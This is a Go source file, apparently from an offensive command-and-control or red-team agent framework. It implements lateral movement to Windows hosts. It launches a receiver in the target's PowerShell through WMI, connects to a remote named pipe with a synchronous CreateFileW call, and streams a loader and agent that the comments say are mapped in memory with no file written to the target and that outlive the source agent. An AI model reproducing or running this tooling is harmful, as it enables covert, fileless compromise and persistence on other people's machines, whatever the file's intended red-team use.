package main

import (
	"fmt"
	"io"
	"os"
	"syscall"
	"time"
	"unsafe"
)

// Named pipe dialing goes through an explicit synchronous CreateFileW.
// os.OpenFile opens Windows handles with FILE_FLAG_OVERLAPPED but performs
// non-pollable file I/O with a null OVERLAPPED, which named pipes reject
// with ERROR_INVALID_PARAMETER (87) on runtimes predating the 2025 poller
// fix. The loader channel needs plain blocking I/O; the deadline wrappers
// already bound blocking calls with goroutine timeouts.
var (
	wmiLoaderKernel32     = syscall.NewLazyDLL("kernel32.dll")
	procLoaderCreateFileW = wmiLoaderKernel32.NewProc("CreateFileW")
)

// CreateFileW parameter values for a synchronous, exclusive pipe client.
const (
	wmiLoaderGenericRead         uintptr       = 0x80000000
	wmiLoaderGenericWrite        uintptr       = 0x40000000
	wmiLoaderOpenExisting        uintptr       = 3
	wmiLoaderFileAttributeNormal uintptr       = 0x80 // no FILE_FLAG_OVERLAPPED
	wmiLoaderErrorNotFound       syscall.Errno = 2    // ERROR_FILE_NOT_FOUND
	wmiLoaderErrorPipeBusy       syscall.Errno = 231  // ERROR_PIPE_BUSY
)

// wmiLoaderMove deploys the server-staged artifact to the target through
// WMI and a named pipe, with no file staged on the target: the remote
// command starts the receiver inside the target's powershell.exe, the
// source streams the framed loader and agent halves over a kernel pipe, and
// the receiver maps the agent in memory. Unlike the WinRM deployment, the
// created process is independent of this source: the deployed session
// survives this agent and ends at target shutdown or an explicit kill.
func wmiLoaderMove(payload lateralPayload, targetSession string, agent []byte, deadline time.Time) error {
	transfer, err := prepareWinRMTransferFromBytes(agent)
	if err != nil {
		return fmt.Errorf("prepare loader transfer: %w", err)
	}
	transfer.deadline = deadline
	pipeName := wmiLoaderPipeName(targetSession)
	script := wmiLoaderScript(pipeName, targetSession, payload.WorkspaceID, transfer)
	command := buildWindowsCmdLine(append([]string{winrmReceiverCommandPath}, wmiLoaderArguments(script)...))
	if err := wmiCreateProcess(payload.Host, command); err != nil {
		return fmt.Errorf("start loader receiver on %s: %w", payload.Host, err)
	}
	conn, err := dialWmiLoaderPipe(payload.Host, pipeName, deadline)
	if err != nil {
		return err
	}
	defer conn.Close()
	if err := wmiCopyWithDeadline(conn, transfer.source, deadline); err != nil {
		return err
	}
	if err := wmiReadLoaderReply(conn, deadline); err != nil {
		return err
	}
	return nil
}

// dialWmiLoaderPipe connects the remote pipe the receiver created with an
// explicit synchronous CreateFileW. WMI returns as soon as the process is
// created, so the listening pipe may not exist yet: file-not-found and
// pipe-busy are retried until the deadline, and any other error is reported
// with the stage that failed.
func dialWmiLoaderPipe(host, pipeName string, deadline time.Time) (io.ReadWriteCloser, error) {
	path := `\\` + host + `\pipe\` + pipeName
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return nil, fmt.Errorf("encode loader channel path: %w", err)
	}
	for {
		// Convert inside Call so Go retains the path for the native call.
		handle, _, callErr := procLoaderCreateFileW.Call(
			uintptr(unsafe.Pointer(pathPtr)),
			wmiLoaderGenericRead|wmiLoaderGenericWrite,
			0, // exclusive pipe instance: no sharing
			0, // no security attributes
			wmiLoaderOpenExisting,
			wmiLoaderFileAttributeNormal,
			0,
		)
		if handle != uintptr(syscall.InvalidHandle) {
			return os.NewFile(handle, path), nil
		}
		if errno, ok := callErr.(syscall.Errno); ok &&
			(errno == wmiLoaderErrorNotFound || errno == wmiLoaderErrorPipeBusy) {
			remaining := time.Until(deadline)
			if remaining <= 0 {
				return nil, fmt.Errorf("the loader channel on %s did not open before the deadline", host)
			}
			time.Sleep(min(250*time.Millisecond, remaining))
			continue
		}
		return nil, fmt.Errorf("open loader channel on %s: %w", host, callErr)
	}
}
